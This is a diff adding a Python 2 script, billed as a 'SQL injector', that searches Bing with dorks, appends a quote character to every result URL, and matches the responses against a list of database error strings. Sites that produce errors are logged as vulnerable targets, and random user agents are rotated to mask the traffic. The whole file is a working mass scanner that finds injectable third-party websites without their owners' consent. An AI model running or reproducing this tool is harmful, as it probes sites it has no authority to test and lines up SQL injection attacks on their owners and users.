@@ -1,0 +1,215 @@
+#!/usr/bin/python
+#-*- encoding: utf-8 -*-
+import requests,random, re,os,signal;from time import *;from sys import *; from datetime import *;import sys; from time import *
+start = strftime("%a, %d %b %Y %I:%M", localtime())
+def sigint_handler(signum, frame):
+    print('\nInterrupted.')
+    exit(1)
+signal.signal(signal.SIGINT, sigint_handler)
+def Space(j):
+	i = 0
+	while i<=j:
+		print " ",
+		i+=1
+#Global variables:
+homedir = os.environ['HOME'];
+blue = '\033[38;5;21m';red = '\033[38;5;1m';yellow = '\033[38;5;11m';green = '\033[38;5;46m';darkgrey='\033[90m'
+file1=os.popen('find -name dorks.txt').read();file2=file1.replace('./','');dork_file='%s/%s'%(homedir,file2)
+file3=os.popen('find -name sqli_').read();file4=file3.replace('./','');vuln_file='%s/%s'%(homedir,file4)
+print blue + '['+green+'!'+blue+']'+ green+ 'Dork file found: '+darkgrey+'%s'%( dork_file)
+s=''
+logo='𝓒 𝓸 𝓭 𝓮 𝓭 𝓫 𝔂 \033[90m𝓡 𝓪 𝓯, \033[38;5;46m𝓓 𝓮 𝓿 𝓮 𝓵 𝓸 𝓹 𝓮 𝓭  𝓫 𝔂  \033[90m𝓣 𝓣 𝓣 '
+am='𝕊ℚ𝕃 𝕚𝕟𝕛𝕖𝕔𝕥𝕠𝕣 '
+sql_errors = ["error in your SQL syntax", "Query failed", "supplied argument is not a valid MySQL result resource in",
+              "You have an error in your SQL syntax",
+              "ORDER BY", "mysql_num_rows()", "SQL query failed", "Microsoft JET Database Engine error '80040e14'",
+              "Microsoft OLE DB Provider for Oracle",
+              "Error:unknown", "Fatal error", "mysql_fetch", "Syntax error", 'mysql_fetch_array()',
+              'expects parameter', 'boolean','Invalid string query','mysql_fetch_assoc()','MYSQL QUERY FAIL',
+              'MySQL Error','check the manual that corresponds to your MySQL server',
+              'Warning: include()','COULD NOT PERFORM QUERY',]
+
+userAgent = [
+    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
+    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
+    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
+    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46',
+    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
+    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
+    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10',
+    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
+    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
+    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
+    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
+    'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
+    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
+    'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0',
+    'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
+    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']
+
+UA = random.choice(userAgent)
+for l in logo:
+	sys.stdout.write('\r')
+	sys.stdout.write(blue+'['+green + '?'+blue + ']'+red+' %s'%(am.decode('utf8', errors='ignore'))+green+'%s'%(s.decode('utf8', errors='ignore')))#+greeen+'►'+white+'%s'%logo)#+white+'%d%%'% (5*i))
+	s+='%s'%l
+	sys.stdout.flush()
+	sleep(.01)
+print 
+
+class get:
+	def __init__(self,total_attempts=0,dork_attempts=0,vulns=0):
+		self.session=requests.Session()
+		Space(9);print darkgrey+' %s' % start
+		Space(7);print blue+'Use custom dorks'+green+'('+yellow+'1'+green+')'+blue+' or dictionary'+green+'('+yellow+'2'+green+')'+blue+' ?'
+		answer=raw_input(blue + '┣▇▇▇═─'+red+'─ '+green)
+		if answer =='1' or answer == 'custom':
+			Space(5);print blue+'Enter dorks separated by a space'+green+'('+yellow+'Ex'+blue+'.'+yellow+' index view page login'+green+')'
+			aaa = raw_input(blue + '┣▇▇▇═─'+red+'─ '+green).split()
+			dorks = [] 
+			for i in aaa:
+				dorks.append(i)
+		elif answer=='2' or answer == 'dictionary':
+			try:
+				with open(dork_file.replace('\n',''), "r") as f:
+					dorks = f.readlines()
+				dorks = [x.strip() for x in dorks]
+			except:
+				string='Error: No dork file found in system '
+				jk=''
+				for l in string:
+					sys.stdout.write('\r')
+					sys.stdout.write(darkgrey+'['+red + '!?!'+darkgrey + '] '+red+'%s'%(jk.decode('utf8', errors='ignore')))
+					jk+='%s'%l
+					sys.stdout.flush()
+					sleep(.02)
+				print
+				exit(0)
+		t1 = datetime.now()
+		for dork in dorks:
+			dork = random.choice(dorks)
+			dork_attempts+=1
+			string='Searching \033[90m%s '%dork
+			s=''
+			for l in string:
+				sys.stdout.write('\r')
+				sys.stdout.write(blue+'['+green + '?'+blue + '] '+green+'%s'%(s.decode('utf8', errors='ignore')))
+				s+='%s'%l
+				sys.stdout.flush()
+				sleep(.02)
+			print
+			self.session.headers.update({'User-Agent':'User-Agent: '+UA})
+			try:
+				page=self.session.get('http://www.bing.com/search?q=%s'%dork).text
+				links=list(set(re.findall('class="b_algo"><h2><a href="([A-Za-z0-9-//-=.-?:-_\:]+)',page)))
+			except:
+				dork = random.choice(dorks)
+				page=self.session.get('http://www.bing.com/search?q=%s'%dork).text
+				links=list(set(re.findall('class="b_algo"><h2><a href="([A-Za-z0-9-//-=.-?:-_\:]+)',page)))
+			for link in links:
+				if 'Facebook' in link or 'facebook' in link:
+					links.pop(links.index(link))
+			for link in links:
+				if 'http' not in link:
+					link = 'http://%s' % link
+				try:
+					page = self.session.get(link + '%27').text
+					total_attempts+=1
+				except:
+					pass
+				dork_attempts+=1
+				for sql_error in sql_errors:
+					if sql_error in page:
+						vulns+=1
+						found=strftime("%a, %d %b %Y %I:%M", localtime())
+						print blue+'['+green + '%s'%vulns+blue + '] '+green+'Found '+red+'"%s"'%sql_error
+						with open('%s/vulns.txt'%vuln_file.replace('\n',''),'a') as out:
+							out.write('{}\n{}\n'.format(found,link))
+						try:
+							for link in links:
+								links.pop(links.index(link))
+						except:
+							for link in links:
+								link = link.replace('http://', '')
+								links.pop(links.index(link))
+						d=''
+						lol='%s '%link
+						for l in lol:
+							sys.stdout.write('\r')
+							sys.stdout.write(blue+'['+green + '%s'%vulns+blue + '] '+darkgrey+'%s'%(d.decode('utf8', errors='ignore')))
+							d+='%s'%l
+							sys.stdout.flush()
+							sleep(.02)
+						print
+			Space(7);print green+'Tried'+blue+' %s'%dork_attempts+green+' links with'+blue+' %s'%dork
+			dork_attempts=0
+		t2 = datetime.now()
+		time = t2 - t1
+		Space(7);print green+'Tried'+blue+' %s'%total_attempts+green+' links in: '+blue+'%s'%(time)
+		Space(7);print green+'A total of '+blue+'%s '%vulns+green+'vulnerable links'
+me=get()
+
+
+
